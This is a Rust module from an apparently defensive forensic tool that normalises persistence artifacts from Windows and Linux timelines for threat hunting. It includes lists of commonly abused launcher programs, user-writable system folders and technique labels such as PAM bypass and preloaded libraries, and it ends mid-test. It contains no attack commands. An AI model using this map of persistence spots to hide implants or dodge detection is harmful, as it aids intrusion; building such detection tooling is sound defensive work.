//! One timeline row as the hunt sees it: operating system, technique, state
//! (live, deleted, shadow copy, carved, previous version), the command that
//! actually runs, the image it points to, the folder family that image lives
//! in, the shape of its name and when the row was written.
//!
//! Everything downstream (rules, stock lists, rarity) works on this view, so
//! a Run key value, a service ImagePath, a cron line and a systemd unit are
//! compared on the same footing.

use chrono::NaiveDateTime;

use crate::event::Event;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Os {
    Windows,
    Linux,
    Unknown,
}

/// How the row reached the timeline.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum State {
    Live,
    Deleted,
    RemovedSinceVss,
    Carved,
    PreviousVersion,
}

impl State {
    pub fn label(self) -> &'static str {
        match self {
            State::Live => "live",
            State::Deleted => "deleted",
            State::RemovedSinceVss => "removed since VSS",
            State::Carved => "carved",
            State::PreviousVersion => "previous version",
        }
    }
}

/// Where an image lives. One enum for both systems so the rarity
/// coordinate is a single categorical; a Windows row never takes a Linux
/// family and vice versa.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum DirFamily {
    // Windows
    System32,
    SysWow64,
    WindowsDir,
    /// Folders under `\Windows` that ordinary users can write to (Temp, Tasks, debug, tracing, spool\drivers\color, ...)
    WindowsWritable,
    ProgramFiles,
    ProgramData,
    UserAppData,
    UserLocalAppData,
    Temp,
    UserProfile,
    Public,
    Recycle,
    DriveRoot,
    Unc,
    // Linux
    UsrBin,
    UsrSbin,
    UsrLib,
    Bin,
    Sbin,
    Lib,
    Etc,
    Opt,
    UsrLocal,
    Var,
    Home,
    RootHome,
    Tmp,
    DevShm,
    VarTmp,
    Hidden,
    Run,
    Mnt,
    // both
    /// No folder at all: resolved through PATH or relative to the caller
    Bare,
    Other,
}

impl DirFamily {
    pub fn label(self) -> &'static str {
        match self {
            DirFamily::System32 => "System32",
            DirFamily::SysWow64 => "SysWOW64",
            DirFamily::WindowsDir => "Windows",
            DirFamily::WindowsWritable => "user-writable Windows folder",
            DirFamily::ProgramFiles => "Program Files",
            DirFamily::ProgramData => "ProgramData",
            DirFamily::UserAppData => "AppData\\Roaming",
            DirFamily::UserLocalAppData => "AppData\\Local",
            DirFamily::Temp => "Temp",
            DirFamily::UserProfile => "user profile",
            DirFamily::Public => "Users\\Public",
            DirFamily::Recycle => "Recycle Bin",
            DirFamily::DriveRoot => "drive root",
            DirFamily::Unc => "network share",
            DirFamily::UsrBin => "/usr/bin",
            DirFamily::UsrSbin => "/usr/sbin",
            DirFamily::UsrLib => "/usr/lib",
            DirFamily::Bin => "/bin",
            DirFamily::Sbin => "/sbin",
            DirFamily::Lib => "/lib",
            DirFamily::Etc => "/etc",
            DirFamily::Opt => "/opt",
            DirFamily::UsrLocal => "/usr/local",
            DirFamily::Var => "/var",
            DirFamily::Home => "/home",
            DirFamily::RootHome => "/root",
            DirFamily::Tmp => "/tmp",
            DirFamily::DevShm => "/dev/shm",
            DirFamily::VarTmp => "/var/tmp",
            DirFamily::Hidden => "hidden directory",
            DirFamily::Run => "/run",
            DirFamily::Mnt => "mount point",
            DirFamily::Bare => "no path",
            DirFamily::Other => "other folder",
        }
    }

    /// Folders where the operating system or an installer puts binaries.
    pub fn is_system(self) -> bool {
        matches!(
            self,
            DirFamily::System32
                | DirFamily::SysWow64
                | DirFamily::WindowsDir
                | DirFamily::ProgramFiles
                | DirFamily::UsrBin
                | DirFamily::UsrSbin
                | DirFamily::UsrLib
                | DirFamily::Bin
                | DirFamily::Sbin
                | DirFamily::Lib
        )
    }

    /// Folders any user can write to without privileges.
    pub fn is_user_writable(self) -> bool {
        matches!(
            self,
            DirFamily::WindowsWritable
                | DirFamily::ProgramData
                | DirFamily::UserAppData
                | DirFamily::UserLocalAppData
                | DirFamily::Temp
                | DirFamily::UserProfile
                | DirFamily::Public
                | DirFamily::Recycle
                | DirFamily::Home
                | DirFamily::Tmp
                | DirFamily::DevShm
                | DirFamily::VarTmp
                | DirFamily::Hidden
                | DirFamily::Run
        )
    }

    /// Scratch folders: nothing legitimate persists from them.
    pub fn is_scratch(self) -> bool {
        matches!(
            self,
            DirFamily::Temp | DirFamily::WindowsWritable | DirFamily::Public | DirFamily::Recycle | DirFamily::Tmp | DirFamily::DevShm | DirFamily::VarTmp
        )
    }
}

/// Shape of a file name, without its extension.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum NameClass {
    /// Letters only (plus `-`, `_`, space, `.`)
    Alpha,
    /// Letters with some digits (`msedge2`, `ie4uinit`)
    AlphaDigits,
    /// Half or more of the characters are digits
    DigitHeavy,
    /// Eight or more hexadecimal characters with at least one digit
    HexLike,
    /// One or two characters
    Tiny,
    /// Non-ASCII or unusual punctuation
    Odd,
    /// Nothing to classify
    Empty,
}

impl NameClass {
    pub fn label(self) -> &'static str {
        match self {
            NameClass::Alpha => "plain name",
            NameClass::AlphaDigits => "name with digits",
            NameClass::DigitHeavy => "mostly digits",
            NameClass::HexLike => "hex-like name",
            NameClass::Tiny => "one or two characters",
            NameClass::Odd => "unusual characters",
            NameClass::Empty => "no name",
        }
    }
}

/// The normalised row.
#[derive(Debug, Clone)]
pub struct Row {
    /// Position in the timeline, so verdicts line up with events.
    pub index: usize,
    pub host: String,
    pub os: Os,
    /// Technique part of the artifact, state prefixes removed:
    /// `registry_run_key`, `windows_service`, `cron:system_job`, `ssh:authorized_key`.
    pub technique: String,
    pub state: State,
    /// The `commandline` column as written, lowercase (Linux rows carry a description around the command).
    pub raw_lower: String,
    /// What actually runs (for Linux rows, extracted from the descriptive text).
    pub command: String,
    pub command_lower: String,
    /// Launcher when the command goes through one (`rundll32.exe`, `powershell.exe`, `sh -c`), lowercase name.
    pub launcher: String,
    /// Full path of the effective image, lowercase, environment variables expanded.
    pub image: String,
    /// File name of the image, lowercase.
    pub image_name: String,
    /// Extension of the image with the dot, lowercase (`.exe`, `.sh`), empty when none.
    pub image_ext: String,
    pub family: DirFamily,
    pub name_class: NameClass,
    /// Where the row was found (`parentprocessname`), lowercase.
    pub location: String,
    pub user: String,
    pub ts: Option<NaiveDateTime>,
    /// Host-independent identity used for fleet prevalence and known-good matching.
    pub canon: String,
}

const STATE_PREFIXES: &[(&str, State)] = &[
    ("carved:deleted:", State::Carved),
    ("carved:", State::Carved),
    ("removed_since_vss:", State::RemovedSinceVss),
    ("deleted:", State::Deleted),
    ("previous_version:", State::PreviousVersion),
];

/// Split `windows:persistence:carved:deleted:registry_run_key` into
/// (Windows, Carved, `registry_run_key`).
pub fn split_artifact(artifact: &str) -> (Os, State, String) {
    let a = artifact.trim();
    let (os, rest) = if let Some(r) = a.strip_prefix("windows:persistence:") {
        (Os::Windows, r)
    } else if let Some(r) = a.strip_prefix("windows:") {
        (Os::Windows, r)
    } else if let Some(r) = a.strip_prefix("linux:") {
        (Os::Linux, r)
    } else {
        (Os::Unknown, a)
    };
    let mut state = State::Live;
    let mut rest = rest;
    for (prefix, st) in STATE_PREFIXES {
        if let Some(r) = rest.strip_prefix(prefix) {
            state = *st;
            rest = r;
            break;
        }
    }
    (os, state, rest.to_string())
}

/// Parse a timeline timestamp; the Linux parsers' epoch placeholder counts as none.
pub fn parse_timestamp(s: &str) -> Option<NaiveDateTime> {
    let t = s.trim();
    if t.is_empty() || t.starts_with("1970-01-01") || t.starts_with("1601-01-01") {
        return None;
    }
    for f in ["%Y-%m-%d %H:%M:%S%.f", "%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S%.f", "%Y-%m-%dT%H:%M:%S"] {
        if let Ok(dt) = NaiveDateTime::parse_from_str(t.trim_end_matches('Z'), f) {
            return Some(dt);
        }
    }
    None
}

// ───────────────────────── Windows image extraction ─────────────────────────

const EXECUTABLE_EXTENSIONS: &[&str] = &[
    ".exe", ".dll", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".scr", ".com", ".msi", ".ocx", ".sys", ".cpl",
    ".hta", ".pif", ".lnk", ".py", ".pyw", ".sh", ".jar", ".msc", ".inf", ".reg", ".sct", ".xml", ".txt", ".dat", ".bin", ".tmp", ".log",
];

/// Programs that run something else named on their command line.
const WINDOWS_LAUNCHERS: &[&str] = &[
    "rundll32.exe", "rundll32", "regsvr32.exe", "regsvr32", "mshta.exe", "mshta", "wscript.exe", "wscript", "cscript.exe", "cscript",
    "powershell.exe", "powershell", "pwsh.exe", "pwsh", "cmd.exe", "cmd", "msiexec.exe", "msiexec", "installutil.exe", "regasm.exe",
    "regsvcs.exe", "msbuild.exe", "python.exe", "pythonw.exe", "python", "java.exe", "javaw.exe", "node.exe", "wmic.exe", "forfiles.exe",
    "conhost.exe", "explorer.exe", "start",
];

/// First path-like token of a Windows command line (quoted path, or the text up to
/// the first executable extension, or the first whitespace token) and the rest.
fn first_token_windows(cmd: &str) -> (String, String) {
    let v = cmd.trim_start();
    if v.is_empty() {
        return (String::new(), String::new());
    }
    if let Some(stripped) = v.strip_prefix('"') {
        if let Some(end) = stripped.find('"') {
            return (stripped[..end].to_string(), stripped[end + 1..].to_string());
        }
        return (stripped.to_string(), String::new());
    }
    let lower = v.to_lowercase();
    let mut best: Option<usize> = None;
    for ext in EXECUTABLE_EXTENSIONS {
        let mut from = 0;
        while let Some(pos) = lower[from..].find(ext) {
            let end = from + pos + ext.len();
            let boundary = lower[end..].chars().next().map(|c| c.is_whitespace() || c == '"' || c == ',' || c == '\'').unwrap_or(true);
            if boundary && best.is_none_or(|b| end < b) {
                best = Some(end);
            }
            from = end;
        }
    }
    let ws_end = v.find(char::is_whitespace).unwrap_or(v.len());
    let first = &lower[..ws_end];
    // `cmd /c "C:\x\y.exe"`, `powershell -f C:\a.ps1`: the first word is a bare
    // program, not the start of a path with spaces
    let is_switch = first.starts_with('/') || first.starts_with('-');
    let bare_first = is_switch || (!first.contains('\\') && !first.contains(':') && (WINDOWS_LAUNCHERS.contains(&first) || !first.contains('.')));
    match best {
        Some(end) if lower.is_char_boundary(end) && !(bare_first && end > ws_end) => (v[..end].to_string(), v[end..].to_string()),
        _ => (v[..ws_end].to_string(), v[ws_end..].to_string()),
    }
}

/// Expand the environment variables an autostart value may carry, lowercase,
/// backslashes only. `C:` stands for every system drive.
pub fn expand_windows_path(p: &str) -> String {
    let mut s = p.trim().trim_matches(|c| c == '"' || c == '\'').replace('/', "\\").to_lowercase();
    if let Some(r) = s.strip_prefix("\\??\\") {
        s = r.to_string();
    } else if let Some(r) = s.strip_prefix("\\\\?\\") {
        s = r.to_string();
    }
    if let Some(r) = s.strip_prefix("\\systemroot\\") {
        s = format!("c:\\windows\\{r}");
    } else if let Some(r) = s.strip_prefix("systemroot\\") {
        s = format!("c:\\windows\\{r}");
    } else if let Some(r) = s.strip_prefix("system32\\") {
        s = format!("c:\\windows\\system32\\{r}");
    }
    const VARS: &[(&str, &str)] = &[
        ("%systemroot%", "c:\\windows"),
        ("%windir%", "c:\\windows"),
        ("%systemdrive%", "c:"),
        ("%programfiles(x86)%", "c:\\program files (x86)"),
        ("%programfiles%", "c:\\program files"),
        ("%programw6432%", "c:\\program files"),
        ("%commonprogramfiles(x86)%", "c:\\program files (x86)\\common files"),
        ("%commonprogramfiles%", "c:\\program files\\common files"),
        ("%programdata%", "c:\\programdata"),
        ("%allusersprofile%", "c:\\programdata"),
        ("%public%", "c:\\users\\public"),
        ("%appdata%", "c:\\users\\<user>\\appdata\\roaming"),
        ("%localappdata%", "c:\\users\\<user>\\appdata\\local"),
        ("%temp%", "c:\\users\\<user>\\appdata\\local\\temp"),
        ("%tmp%", "c:\\users\\<user>\\appdata\\local\\temp"),
        ("%userprofile%", "c:\\users\\<user>"),
        ("%homepath%", "\\users\\<user>"),
        ("%homedrive%", "c:"),
    ];
    for (var, val) in VARS {
        if s.contains(var) {
            s = s.replace(var, val);
        }
    }
    s
}

const WINDOWS_WRITABLE: &[&str] = &[
    "\\windows\\temp\\",
    "\\windows\\tasks\\",
    "\\windows\\debug\\",
    "\\windows\\tracing\\",
    "\\windows\\fonts\\",
    "\\windows\\pla\\",
    "\\windows\\registration\\crmlog\\",
    "\\windows\\system32\\tasks\\",
    "\\windows\\syswow64\\tasks\\",
    "\\windows\\system32\\spool\\drivers\\color\\",
    "\\windows\\system32\\spool\\printers\\",
    "\\windows\\system32\\microsoft\\crypto\\rsa\\machinekeys\\",
    "\\windows\\system32\\config\\systemprofile\\",
    "\\windows\\syswow64\\config\\systemprofile\\",
    "\\windows\\system32\\fxstmp\\",
    "\\windows\\syswow64\\fxstmp\\",
    "\\windows\\system32\\com\\dmp\\",
    "\\windows\\servicing\\packages\\",
    "\\windows\\servicing\\sessions\\",
];

/// Folder family of an expanded, lowercase Windows path.
pub fn windows_family(path: &str) -> DirFamily {
    let p = path;
    if p.is_empty() {
        return DirFamily::Bare;
    }
    if p.starts_with("\\\\") {
        return DirFamily::Unc;
    }
    let has_drive = p.len() >= 3 && p.as_bytes()[1] == b':' && p.as_bytes()[2] == b'\\';
    let rest = if has_drive {
        &p[2..]
    } else if p.starts_with('\\') {
        p
    } else {
        return if p.contains('\\') { DirFamily::Other } else { DirFamily::Bare };
    };
    for w in WINDOWS_WRITABLE {
        if rest.starts_with(w) {
            return DirFamily::WindowsWritable;
        }
    }
    if rest.starts_with("\\windows\\system32\\") {
        return DirFamily::System32;
    }
    if rest.starts_with("\\windows\\syswow64\\") {
        return DirFamily::SysWow64;
    }
    if rest.starts_with("\\windows\\") || rest.starts_with("\\winnt\\") {
        return DirFamily::WindowsDir;
    }
    if rest.starts_with("\\program files\\") || rest.starts_with("\\program files (x86)\\") {
        return DirFamily::ProgramFiles;
    }
    if rest.starts_with("\\programdata\\") {
        return DirFamily::ProgramData;
    }
    if rest.starts_with("\\$recycle.bin\\") || rest.starts_with("\\recycler\\") || rest.starts_with("\\recycled\\") {
        return DirFamily::Recycle;
    }
    if rest.starts_with("\\temp\\") || rest.starts_with("\\tmp\\") {
        return DirFamily::Temp;
    }
    if rest.starts_with("\\users\\public\\") {
        return DirFamily::Public;
    }
    for root in ["\\users\\", "\\documents and settings\\"] {
        if let Some(after_root) = rest.strip_prefix(root) {
            let Some(slash) = after_root.find('\\') else { return DirFamily::UserProfile };
            let inside = &after_root[slash..];
            if inside.starts_with("\\appdata\\local\\temp\\") || inside.starts_with("\\local settings\\temp\\") {
                return DirFamily::Temp;
            }
            if inside.starts_with("\\appdata\\roaming\\") || inside.starts_with("\\application data\\") {
                return DirFamily::UserAppData;
            }
            if inside.starts_with("\\appdata\\local\\") || inside.starts_with("\\appdata\\locallow\\") || inside.starts_with("\\local settings\\") {
                return DirFamily::UserLocalAppData;
            }
            return DirFamily::UserProfile;
        }
    }
    // `c:\file.exe`: nothing between the drive and the name
    if rest[1..].find('\\').is_none() {
        return DirFamily::DriveRoot;
    }
    DirFamily::Other
}

fn file_name_of(path: &str, sep: &[char]) -> String {
    path.rsplit(sep).next().unwrap_or(path).to_string()
}

fn ext_of(name: &str) -> String {
    match name.rfind('.') {
        Some(i) if i > 0 && i + 1 < name.len() && name.len() - i <= 6 => name[i..].to_string(),
        _ => String::new(),
    }
}

/// Shape of a file name (extension removed first).
pub fn classify_name(name: &str) -> NameClass {
    let stem = match name.rfind('.') {
        Some(i) if i > 0 => &name[..i],
        _ => name,
    };
    let stem = stem.trim();
    if stem.is_empty() {
        return NameClass::Empty;
    }
    let chars: Vec<char> = stem.chars().collect();
    if chars
        .iter()
        .any(|c| !c.is_ascii() || !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | ' ' | '.' | '+' | '(' | ')' | '@' | ',' | '~')))
    {
        return NameClass::Odd;
    }
    let alnum: Vec<char> = chars.iter().copied().filter(|c| c.is_ascii_alphanumeric()).collect();
    if alnum.len() <= 2 {
        return NameClass::Tiny;
    }
    let digits = alnum.iter().filter(|c| c.is_ascii_digit()).count();
    if alnum.len() >= 8 && digits > 0 && alnum.iter().all(|c| c.is_ascii_hexdigit()) {
        return NameClass::HexLike;
    }
    if digits * 2 >= alnum.len() {
        return NameClass::DigitHeavy;
    }
    if digits > 0 {
        return NameClass::AlphaDigits;
    }
    NameClass::Alpha
}

struct Extracted {
    launcher: String,
    image: String,
}

fn extract_windows(cmd: &str) -> Extracted {
    let (head, rest) = first_token_windows(cmd);
    let head_exp = expand_windows_path(&head);
    let head_name = file_name_of(&head_exp, &['\\']);
    let is_launcher = WINDOWS_LAUNCHERS.contains(&head_name.as_str());
    if !is_launcher {
        return Extracted { launcher: String::new(), image: head_exp };
    }
    // `cmd /c start "" "C:\x\y.exe"`, `rundll32 C:\x\y.dll,Entry`, `powershell -f C:\x\y.ps1`
    let mut tail = rest;
    let mut hops = 0;
    loop {
        let t = tail.trim_start().to_string();
        if t.is_empty() || hops > 64 {
            break;
        }
        hops += 1;
        let (tok, rest2) = first_token_windows(&t);
        if tok.starts_with('/') || tok.starts_with('-') {
            // a switch, not a file
            if rest2.len() >= t.len() {
                break;
            }
            tail = rest2;
            continue;
        }
        let tok_exp = expand_windows_path(&tok);
        let tok_name = file_name_of(&tok_exp, &['\\']);
        let looks_like_file = tok_exp.contains('\\') || !ext_of(&tok_name).is_empty();
        let is_nested_launcher = WINDOWS_LAUNCHERS.contains(&tok_name.as_str());
        if looks_like_file && !is_nested_launcher && !tok_exp.is_empty() {
            return Extracted { launcher: head_name, image: tok_exp };
        }
        if rest2.len() >= t.len() {
            break;
        }
        tail = rest2;
    }
    Extracted { launcher: head_name, image: head_exp }
}

// ───────────────────────── Linux command extraction ─────────────────────────

/// Pull the command out of the descriptive `commandline` the Linux parsers write.
pub fn linux_command_of(commandline: &str) -> String {
    let c = commandline.trim();
    if let Some(r) = c.strip_prefix("Systemd Unit: ") {
        if let Some(i) = r.find(", Exec: ") {
            return r[i + 8..].trim_end_matches(')').trim().to_string();
        }
        return r.to_string();
    }
    if let Some(r) = c.strip_prefix("System Cron: ") {
        if let Some(i) = r.rfind(" (File: ") {
            return r[..i].trim().to_string();
        }
        return r.to_string();
    }
    if let Some(r) = c.strip_prefix("Systemd Timer: ") {
        let r = r.split(" -> ").nth(1).unwrap_or(r);
        return r.split(" (").next().unwrap_or(r).trim().to_string();
    }
    if let Some(r) = c.strip_prefix("XDG Autostart: ") {
        if let Some(i) = r.rfind(" -> ") {
            return r[i + 4..].trim().to_string();
        }
        return r.to_string();
    }
    if let Some(r) = c.strip_prefix("Kernel Auto-load Module: ") {
        return r.split(" (File: ").next().unwrap_or(r).trim().to_string();
    }
    if let Some(r) = c.strip_prefix("Modprobe Install Hook") {
        let after = r.find("]: ").map(|i| &r[i + 3..]).unwrap_or(r);
        // `install <module> <command>`
        let mut it = after.splitn(3, char::is_whitespace);
        return match (it.next(), it.next(), it.next()) {
            (Some("install"), Some(_), Some(cmd)) => cmd.trim().to_string(),
            _ => after.trim().to_string(),
        };
    }
    if let Some(r) = c.strip_prefix("Anacron") {
        if let Some(i) = r.find("): ") {
            return r[i + 3..].trim().to_string();
        }
        return r.trim().to_string();
    }
    if let Some(r) = c.strip_prefix("APT Hook") {
        let after = r.find("]: ").map(|i| &r[i + 3..]).unwrap_or(r);
        if let Some(q) = after.find('"') {
            let body = &after[q + 1..];
            if let Some(e) = body.find('"') {
                return body[..e].trim().to_string();
            }
        }
        return after.trim().to_string();
    }
    if let Some(r) = c.strip_prefix("Udev") {
        let after = r.find("]: ").map(|i| &r[i + 3..]).unwrap_or(r);
        // RUN+="/path args"
        if let Some(i) = after.find("RUN") {
            let s = &after[i..];
            if let Some(q) = s.find('"') {
                let body = &s[q + 1..];
                return body.split('"').next().unwrap_or(body).trim().to_string();
            }
        }
        return after.trim().to_string();
    }
    for prefix in [
        "User Cron ",
        "rc.local ",
        "Sudoers Defaults ",
        "Sudoers ",
        "PAM Bypass ",
        "PAM Rogue Module ",
        "PAM ",
        "sshd_config ",
        "Systemd Activation ",
    ] {
        if let Some(r) = c.strip_prefix(prefix) {
            if let Some(i) = r.find("]: ") {
                return r[i + 3..].trim().to_string();
            }
            if let Some(i) = r.find(": ") {
                return r[i + 2..].trim().to_string();
            }
            return r.trim().to_string();
        }
    }
    for prefix in ["Preloaded Dynamic Library: ", "Executing Binary Link: ", "Periodic Cron Script: ", "Systemd Generator Executable: ", "User Cron: "] {
        if let Some(r) = c.strip_prefix(prefix) {
            return r.trim().to_string();
        }
    }
    // profiles: `<file> [line n]: <text>`; anything else: text after the first `: `
    if let Some(i) = c.find("]: ") {
        return c[i + 3..].trim().to_string();
    }
    if let Some(i) = c.find(": ") {
        return c[i + 2..].trim().to_string();
    }
    c.to_string()
}

const LINUX_SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "busybox"];
const LINUX_WRAPPERS: &[&str] = &["nohup", "setsid", "sudo", "env", "nice", "ionice", "timeout", "exec", "flock", "chronic", "stdbuf", "xargs", "su"];

/// Peel systemd prefixes, `cd x &&`, `VAR=value`, wrappers (`nohup`, `env`...)
/// and `sh -c "..."` off a command. Returns (launcher, effective command).
fn strip_shell_wrappers(cmd: &str) -> (String, String) {
    let mut s: &str = cmd.trim();
    let mut launcher = String::new();
    while let Some(r) = s.strip_prefix(['-', '@', '+', '!', ':']) {
        s = r.trim_start();
    }
    if s.starts_with("cd ") {
        if let Some(i) = s.find("&&") {
            s = s[i + 2..].trim_start();
        }
    }
    let mut hops = 0;
    loop {
        hops += 1;
        if hops > 32 {
            break;
        }
        let (tok, rest_at) = token_and_rest(s);
        let name = file_name_of(&tok, &['/']);
        let rest = s[rest_at..].trim_start();
        if !tok.starts_with('/') && tok.contains('=') && !tok.starts_with('-') {
            // VAR=value prefix
            if rest.is_empty() {
                break;
            }
            s = rest;
            continue;
        }
        if LINUX_WRAPPERS.contains(&name.as_str()) {
            if launcher.is_empty() {
                launcher = name.clone();
            }
            let mut r = rest;
            while r.starts_with('-') {
                let end = r.find(char::is_whitespace).unwrap_or(r.len());
                r = r[end..].trim_start();
            }
            if r.is_empty() {
                break;
            }
            s = r;
            continue;
        }
        if LINUX_SHELLS.contains(&name.as_str()) {
            if let Some(after) = rest.strip_prefix("-lc").or_else(|| rest.strip_prefix("-ic")).or_else(|| rest.strip_prefix("-c")) {
                launcher = name.clone();
                let body = after.trim_start();
                let body = match body.chars().next() {
                    Some(q @ ('"' | '\'')) => {
                        let inner = &body[1..];
                        inner.find(q).map(|i| &inner[..i]).unwrap_or(inner)
                    }
                    _ => body,
                };
                let body = body.trim();
                if body.is_empty() {
                    break;
                }
                s = body;
                continue;
            }
            if !rest.is_empty() && !rest.starts_with('-') {
                // `sh /path/script.sh`
                launcher = name.clone();
                s = rest;
                continue;
            }
        }
        break;
    }
    (launcher, s.to_string())
}

/// First token of `s` and the offset where the rest begins.
fn token_and_rest(s: &str) -> (String, usize) {
    let lead = s.len() - s.trim_start().len();
    let v = &s[lead..];
    if v.is_empty() {
        return (String::new(), s.len());
    }
    if let Some((inner, ch)) = v.strip_prefix('"').map(|r| (r, '"')).or_else(|| v.strip_prefix('\'').map(|r| (r, '\''))) {
        return match inner.find(ch) {
            Some(end) => (inner[..end].to_string(), lead + 1 + end + 1),
            None => (inner.to_string(), s.len()),
        };
    }
    let end = v.find(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&')).unwrap_or(v.len());
    (v[..end].to_string(), lead + end)
}

fn first_token_linux(s: &str) -> (String, String) {
    let v = s.trim_start();
    if v.is_empty() {
        return (String::new(), String::new());
    }
    if let Some((inner, ch)) = v.strip_prefix('"').map(|r| (r, '"')).or_else(|| v.strip_prefix('\'').map(|r| (r, '\''))) {
        if let Some(end) = inner.find(ch) {
            return (inner[..end].to_string(), inner[end + 1..].to_string());
        }
        return (inner.to_string(), String::new());
    }
    let end = v.find(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&')).unwrap_or(v.len());
    (v[..end].to_string(), v[end..].to_string())
}

/// Folder family of a Linux path.
pub fn linux_family(path: &str) -> DirFamily {
    let p = path;
    if p.is_empty() {
        return DirFamily::Bare;
    }
    if !p.starts_with('/') {
        return if p.contains('/') { DirFamily::Other } else { DirFamily::Bare };
    }
    let system = [
        ("/usr/bin/", DirFamily::UsrBin),
        ("/usr/sbin/", DirFamily::UsrSbin),
        ("/usr/lib/", DirFamily::UsrLib),
        ("/usr/lib64/", DirFamily::UsrLib),
        ("/usr/lib32/", DirFamily::UsrLib),
        ("/usr/libexec/", DirFamily::UsrLib),
        ("/usr/share/", DirFamily::UsrLib),
        ("/bin/", DirFamily::Bin),
        ("/sbin/", DirFamily::Sbin),
        ("/lib/", DirFamily::Lib),
        ("/lib64/", DirFamily::Lib),
        ("/lib32/", DirFamily::Lib),
    ];
    for (prefix, fam) in system {
        if p.starts_with(prefix) {
            return fam;
        }
    }
    let scratch = [
        ("/tmp/", DirFamily::Tmp),
        ("/dev/shm/", DirFamily::DevShm),
        ("/var/tmp/", DirFamily::VarTmp),
        ("/run/", DirFamily::Run),
        ("/var/run/", DirFamily::Run),
    ];
    for (prefix, fam) in scratch {
        if p.starts_with(prefix) {
            return fam;
        }
    }
    // a hidden folder anywhere outside the system tree
    let dir = match p.rfind('/') {
        Some(i) => &p[..i],
        None => p,
    };
    if dir.split('/').any(|c| c.len() > 1 && c.starts_with('.')) {
        return DirFamily::Hidden;
    }
    let rest = [
        ("/usr/local/", DirFamily::UsrLocal),
        ("/etc/", DirFamily::Etc),
        ("/opt/", DirFamily::Opt),
        ("/var/", DirFamily::Var),
        ("/home/", DirFamily::Home),
        ("/root/", DirFamily::RootHome),
        ("/mnt/", DirFamily::Mnt),
        ("/media/", DirFamily::Mnt),
        ("/srv/", DirFamily::Var),
    ];
    for (prefix, fam) in rest {
        if p.starts_with(prefix) {
            return fam;
        }
    }
    DirFamily::Other
}

fn extract_linux(cmd: &str) -> Extracted {
    let (launcher, eff) = strip_shell_wrappers(cmd);
    let (tok, _) = first_token_linux(&eff);
    Extracted { launcher, image: tok }
}

// ───────────────────────── canonical identity ───────────────────────────────

/// Host-independent identity of a row: technique plus the command with user
/// names, SIDs, GUIDs and drive letters neutralised. Two hosts with the same
/// Run key value written for different users share one canon.
pub fn canonical(os: Os, technique: &str, command_lower: &str) -> String {
    let mut c = command_lower.to_string();
    if os == Os::Windows {
        c = expand_windows_path(&c);
        c = mask_between(&c, "\\users\\", '\\', "<user>");
        c = mask_between(&c, "\\documents and settings\\", '\\', "<user>");
        if c.len() >= 2 && c.as_bytes()[1] == b':' {
            c.replace_range(0..1, "c");
        }
    } else {
        c = mask_between(&c, "/home/", '/', "<user>");
    }
    c = mask_sids(&c);
    c = mask_guids(&c);
    format!("{}|{}", technique, c.split_whitespace().collect::<Vec<_>>().join(" "))
}

fn mask_between(s: &str, prefix: &str, stop: char, with: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find(prefix) {
        out.push_str(&rest[..i + prefix.len()]);
        let after = &rest[i + prefix.len()..];
        out.push_str(with);
        match after.find(stop) {
            Some(j) => rest = &after[j..],
            None => rest = "",
        }
    }
    out.push_str(rest);
    out
}

fn mask_sids(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find("s-1-5-21-") {
        out.push_str(&rest[..i]);
        let after = &rest[i..];
        let end = after.find(|c: char| !(c.is_ascii_digit() || c == '-' || c == 's')).unwrap_or(after.len());
        out.push_str("<sid>");
        rest = &after[end..];
    }
    out.push_str(rest);
    out
}

fn mask_guids(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'{' && i + 38 <= b.len() && b[i + 37] == b'}' {
            let inner = &b[i + 1..i + 37];
            let ok = inner.iter().enumerate().all(|(k, c)| if matches!(k, 8 | 13 | 18 | 23) { *c == b'-' } else { c.is_ascii_hexdigit() });
            if ok {
                out.push_str("<guid>");
                i += 38;
                continue;
            }
        }
        let ch = s[i..].chars().next().unwrap_or(' ');
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// Build the hunt's view of one event.
pub fn normalize(index: usize, e: &Event) -> Row {
    let (os, state, technique) = split_artifact(&e.artifact);
    let raw = e.commandline.as_deref().unwrap_or("");
    let command = match os {
        Os::Linux => linux_command_of(raw),
        _ => raw.trim().to_string(),
    };
    let command_lower = command.to_lowercase();
    let ex = match os {
        Os::Linux => extract_linux(&command),
        _ => extract_windows(&command),
    };
    let (image, family, image_name) = match os {
        Os::Linux => {
            let name = file_name_of(&ex.image, &['/']);
            (ex.image.clone(), linux_family(&ex.image), name)
        }
        _ => {
            let name = file_name_of(&ex.image, &['\\']);
            (ex.image.clone(), windows_family(&ex.image), name)
        }
    };
    let image_ext = ext_of(&image_name);
    let name_class = classify_name(&image_name);
    let canon = canonical(os, &technique, &command_lower);
    Row {
        index,
        host: e.computer.clone(),
        os,
        technique,
        state,
        raw_lower: raw.to_lowercase(),
        command,
        command_lower,
        launcher: ex.launcher.to_lowercase(),
        image,
        image_name,
        image_ext,
        family,
        name_class,
        location: e.parentprocessname.to_lowercase(),
        user: e.target_username.clone(),
        ts: parse_timestamp(&e.timestamp),
        canon,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn artifact_split() {
        assert_eq!(split_artifact("windows:persistence:registry_run_key"), (Os::Windows, State::Live, "registry_run_key".into()));
        assert_eq!(split_artifact("windows:persistence:carved:deleted:windows_service"), (Os::Windows, State::Carved, "windows_service".into()));
        assert_eq!(split_artifact("windows:persistence:removed_since_vss:x"), (Os::Windows, State::RemovedSinceVss, "x".into()));
        assert_eq!(split_artifact("linux:deleted:cron:system_job"), (Os::Linux, State::Deleted, "cron:system_job".into()));
